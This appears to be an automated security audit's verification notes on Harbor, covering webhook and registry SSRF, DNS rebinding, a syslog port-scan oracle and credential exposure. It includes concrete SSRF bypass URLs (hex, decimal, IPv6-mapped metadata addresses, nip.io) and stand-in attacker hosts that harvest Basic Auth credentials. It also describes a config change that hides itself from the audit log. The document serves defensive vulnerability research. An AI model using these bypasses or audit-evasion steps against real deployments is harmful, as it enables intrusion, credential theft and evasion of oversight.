# Round 3 Hypotheses: Causal Verification
## Reasoning Model: causal-verifier-03

Verifying cross-model seeds through counterfactual and intervention analysis. For each claim, I identify what structural change would remove the vulnerability and confirm that no such structure currently exists.

---

## PH-C01: Webhook SSRF + auth_header = Authenticated Internal Service Access (Validates CROSS-01)

**Causal test:** Would removing private IP access from the Job Service container prevent this attack? YES — network-level mitigation works. Does any software-layer control exist? NO.

**Counterfactual:** If `validateTargets` called `net.ParseIP(url.Host)` and checked against RFC1918 ranges, would PH-01 be blocked? YES for direct IP URLs. Would it block DNS rebinding (CROSS-02)? NO.

**Causal chain confirmed:**
1. `CreateWebhookPolicyOfProject` → `validateTargets` → `ParseEndpoint` → returns URL with `http://` scheme → stored in DB (NO IP CHECK)
2. `HTTPHandler.process` enqueues job with `address = stored URL`, `skip_cert_verify = target.SkipCertVerify`, `header = JSON({Content-Type: application/json, Authorization: target.AuthHeader})`
3. `WebhookJob.execute` → `http.NewRequest(POST, address)` → `req.Header = header` (sets Authorization) → `wj.client.Do(req)` (uses insecure transport if skip_cert_verify=true)

**Critical refinement from code reading:** `auth_header` maps to `Authorization` header value only (via `header.Set("Authorization", event.Target.AuthHeader)` in `http_handler.go:79`). This is still significant: an attacker can set `auth_header = "Bearer <internal-service-token>"` and the webhook will present this token to the internal service.

**Severity confirmation:** HIGH. The combination of (no IP filtering) + (user-controlled Authorization header) + (optional TLS skip) enables authenticated internal service access from project-admin privilege.

**Verdict:** VALIDATED

**Fragility:** LOW — no known defense in place; only network segmentation would prevent exploitation

---

## PH-C02: DNS Rebinding as Architectural Bypass (Validates CROSS-02)

**Causal test:** If private IP filtering were added to `validateTargets` alone (at store time), would SSRF still be possible? YES via DNS rebinding.

**Counterfactual:** If the Job Service HTTP transport used a custom `DialContext` that re-validated the resolved IP before connecting, would DNS rebinding be blocked? YES. Does such a `DialContext` exist?

**Code check performed:**
- `WebhookJob.init` → `httpHelper.clients[secure]` → `commonhttp.GetHTTPTransport()` — standard transport
- `http_helper.go:67-74` — `http.Client{Transport: commonhttp.GetHTTPTransport(), ...}` — no custom DialContext
- `src/pkg/p2p/preheat/provider/client/http_client.go:67-77` — standard `http.Transport` with TLS config only — no custom DialContext

**Confirmed:** No custom DialContext anywhere in the SSRF execution paths. DNS is resolved at request time by the standard Go DNS resolver with no IP validation post-resolution.

**Verdict:** VALIDATED (architectural gap confirmed)

**Fragility:** LOW — this is a structural design gap, not a code path that could accidentally be blocked

---

## PH-C03: Audit Forward TCP SSRF with Port Scan Oracle (Validates CROSS-03)

**Causal test:** If `CheckEndpointActive` were removed or replaced with a non-probing check, would the TCP SSRF vector be eliminated?

**Causal chain confirmed:**
1. `UpdateConfigurations` (system-admin authenticated) → `UpdateUserConfigs` → `validateCfg` (no endpoint validation) → `mgr.UpdateConfig` (stores new endpoint) → `updateLogEndpoint`
2. `updateLogEndpoint` reads new endpoint from DB, calls `audit.CheckEndpointActive(auditEP)`
3. `CheckEndpointActive` → `syslog.Dial("tcp", address, syslog.LOG_INFO, "audit")` — TCP SYN to attacker-controlled host:port
4. `syslog.Dial` error is logged and function returns `false`
5. `updateLogEndpoint` returns `errors.BadRequestError(fmt.Errorf("could not connect to the audit endpoint: %v", auditEP))` if check fails
6. HTTP response to caller contains error message indicating connection failure — **this text varies based on failure mode**

**Oracle confirmed:** Three distinguishable states returned to caller:
- Port open + syslog handshake fails: `"could not connect to audit endpoint: <address>"` (syslog error)
- Port closed (connection refused): same error with different underlying message captured in log
- Port filtered (timeout): same error but after ~30s timeout

**Additional TCP SSRF:** Even if `CheckEndpointActive` returns false, `audit.LogMgr.Init` is NOT called (due to the early return). But the TCP connection was already attempted. The TCP probe is atomic with the validation.

**Counterfactual:** If `CheckEndpointActive` used a URL-based scheme (HTTP probe) instead of TCP syslog dial, would this be safer? Only marginally — HTTP probe would still allow internal HTTP service scanning. The root issue is that any liveness check to an admin-supplied address is an SSRF probe.

**Verdict:** VALIDATED — HIGH severity TCP port scan

**Fragility:** LOW — well-established code path

---

## PH-C04: GetRegistryInfo Immediate SSRF + Credential Forwarding (Validates CROSS-04)

**Causal test:** What credential is sent in the Ping request to the registry URL?

**Confirmed code path for credential forwarding:**
1. `GetRegistryInfo` → registry controller → creates adapter via `adp.Get(reg)` → `native.NewAdapter(reg)`
2. `NewAdapter(reg)`: `registry.NewClientWithCACert(reg.URL, reg.Credential.AccessKey, reg.Credential.AccessSecret, reg.Insecure, reg.CACertificate)`
3. `registry.Client` authenticates using Basic Auth: `AccessKey:AccessSecret` encoded in Authorization header
4. `HealthCheck` → `a.Ping()` → GET `{url}/v2/` with `Authorization: Basic <base64(key:secret)>`

**Credential type stored:** The `Credential.Type` field can be `basic` (username/password) or `oauth` (access key/token for cloud registries). For basic, the base64-encoded credentials are sent in the first HTTP request.

**Attack confirmed:** System admin creates registry with `url=http://attacker.example.com` and `credential.access_key=admin-robot` + `credential.access_secret=<robot-secret>`. Calls `GET /api/v2.0/registries/{id}/info`. Harbor immediately sends `Authorization: Basic <base64(admin-robot:robot-secret)>` to `attacker.example.com/v2/`. Attacker harvests credentials from HTTP request log.

**Verdict:** VALIDATED — HIGH severity (credential theft + SSRF combined)

**Fragility:** LOW

---

## PH-C05: Preheat Provider SSRF via IP Encoding (Validates CROSS-05)

**Causal test:** Does `url.Parse` in `lib.ValidateHTTPURL` normalize IP encoding variants?

**Analysis of Go's `url.Parse` behavior:**
- `url.Parse("http://0x7f000001/healthy")` → `url.Host = "0x7f000001"` — no normalization, scheme is "http" → `ValidateHTTPURL` returns `"http://0x7f000001/healthy"` — PASSES
- `url.Parse("http://2130706433/healthy")` → `url.Host = "2130706433"` — no normalization → PASSES
- `url.Parse("http://127.1/healthy")` → `url.Host = "127.1"` → PASSES
- `url.Parse("http://[::1]/healthy")` → `url.Host = "[::1]"` → scheme is "http" → PASSES
- `url.Parse("http://[::ffff:169.254.169.254]/healthy")` → `url.Host = "[::ffff:169.254.169.254]"` → PASSES

**Go HTTP client behavior:** When the HTTP client dials these addresses, Go's standard resolver/dialer does resolve hex IPs and decimal IPs to their actual network addresses. So `http://0x7f000001/` connects to `127.0.0.1`.

**Counterfactual:** If `ValidateHTTPURL` used `net.ParseIP(url.Hostname())` and rejected RFC1918/loopback, would these bypass? YES — `net.ParseIP("0x7f000001")` returns nil (doesn't parse hex), so this specific encoding wouldn't be caught either.

**Additional finding:** `url.Parse("http://127.0.0.1.nip.io/")` → `url.Host = "127.0.0.1.nip.io"` — DNS-based wildcard bypass. The name resolves to `127.0.0.1` via the public nip.io service.

**Verdict:** VALIDATED — both standard and encoded private IP addresses pass ValidateHTTPURL

**Fragility:** LOW — no IP normalization in Go's url.Parse for non-standard representations

---

## PH-C06: Skip-Audit-DB + External Syslog = Evidence Destruction (Validates CROSS-06)

**Causal test:** Can setting `skip_audit_log_database=true` prevent the config-change event from being written to the DB?

**Code flow for config update audit:**
1. `UpdateConfigurations` handler → `RequireSystemAccess` → `UpdateUserConfigs` → succeeds
2. The audit event for the config update is generated AFTER the handler returns success
3. The audit event creation calls `auditext.Mgr.Create(ctx, event)` → checks `config.SkipAuditLogDatabase(ctx)` → if true, returns 0 (skips DB write)

**Timing analysis:** The config is saved to DB first (`mgr.UpdateConfig`), THEN `updateLogEndpoint` is called. The audit event for the `PUT /api/v2.0/configurations` request is generated after the HTTP handler completes. At that point, the new config values (including `skip_audit_log_database=true`) are already active.

**Critical finding confirmed:** If a single `PUT /api/v2.0/configurations` request sets BOTH `skip_audit_log_database=true` AND `audit_log_forward_endpoint=attacker:514`, then:
1. Config is saved
2. Handler returns HTTP 200
3. Audit event for this config change is created
4. `auditext.Mgr.Create` checks `SkipAuditLogDatabase(ctx)` — which now reads the NEW config (skip=true)
5. The audit event for the config change itself is NOT written to DB
6. It IS forwarded to the attacker's syslog (via `auditV1.LogMgr.DefaultLogger`)

**Verdict:** VALIDATED — CRITICAL evidence destruction: the config change that enables exfiltration is not recorded in Harbor's own audit log

**Fragility:** LOW — depends on the order of config read in `SkipAuditLogDatabase(ctx)` which reads from the DB after config is saved

---

## PH-C07: Solution-User Auth Bypass Leads to Full Credential Exfiltration (Validates PH-05)

**Causal test:** What other code paths lead to the solution-user security context being established?

**Solution-user auth is the "Secret" context from the authentication chain.** The shared secret between Core and Job Service is in the `JOBSERVICE_SECRET` / `CORE_SECRET` env variables. Any request with the `Authorization: Harbor-Secret <secret>` header is treated as solution-user.

**Counterfactual:** If the shared secret were compromised (e.g., from a container environment variable leak, Kubernetes secret store, or Docker exec access), could an attacker call `GetConfigurations` as solution-user? YES — single API call returns all config including LDAP bind password, OIDC client secret.

**No additional gate:** The `IsSolutionUser()` check in `GetConfigurations` branches immediately to `AllConfigs` without any additional privilege check. There is no rate limiting or IP restriction on this path.

**Severity confirmation:** CRITICAL if secret is obtainable. The attack is a single HTTP request.

**Verdict:** VALIDATED (the code path is confirmed; severity depends on secret-obtainability which is deployment-specific)

**Fragility:** MEDIUM — depends on secret compromise; but Harbor deployment guides do not consistently enforce secret rotation

---

## PH-C08: Replication Job Carries Registry Credentials in Redis Job Queue (New Finding)

**Causal test:** Are registry credentials (AccessKey/AccessSecret) stored in the Redis job queue in plaintext as part of the job parameters?

**Code path:**
1. `Replication.Run` calls `parseParams` which deserializes `src` and `dst` as `model.Resource` from job parameters
2. `model.Resource` includes a `Registry` field of type `*model.Registry`
3. `model.Registry` includes `Credential *model.Credential` with `AccessKey string` and `AccessSecret string`
4. These are serialized as JSON when the job is enqueued in Redis: `src_resource = json(Resource{Registry: {Credential: {AccessKey, AccessSecret}}})`

**Implication:** Anyone with read access to the Redis job queue can extract plaintext registry credentials (including cloud registry tokens, Harbor robot account credentials, etc.).

**Redis security:** By default, Redis in Harbor deployments often has no authentication (TB-4 in KB). Even with auth, the job queue is a shared data structure.

**Severity estimate:** HIGH (registry credentials stored in Redis job queue plaintext)

**Verdict:** NEEDS-DEEPER (need to verify whether AccessSecret is encrypted at rest in the DB and whether Redis job params are encrypted — current analysis suggests they are not)
